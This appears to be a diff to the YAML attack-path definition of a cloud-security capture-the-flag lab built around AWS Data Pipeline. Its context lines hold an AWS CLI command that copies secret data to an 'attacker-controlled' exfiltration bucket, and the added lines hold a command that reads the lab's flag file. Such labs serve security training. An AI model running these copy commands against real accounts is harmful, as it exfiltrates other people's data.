@@ -97,6 +97,8 @@ attackMap:
       commands:
         - description: "Copy sensitive data to attacker-controlled exfil bucket (executed inside pipeline via ShellCommandActivity)"
           command: "aws s3 cp s3://pl-sensitive-data-datapipeline-001-ACCOUNT-SUFFIX/secret-data.txt s3://pl-exfil-bucket-datapipeline-001-ATTACKER_ACCOUNT-SUFFIX/exfiltrated.txt"
+        - description: "Capture the CTF flag"
+          command: "aws s3 cp s3://pl-sensitive-data-datapipeline-001-{account_id}-{suffix}/flag.txt -"
 
     - from: pipeline-role
       to: exfil-bucket
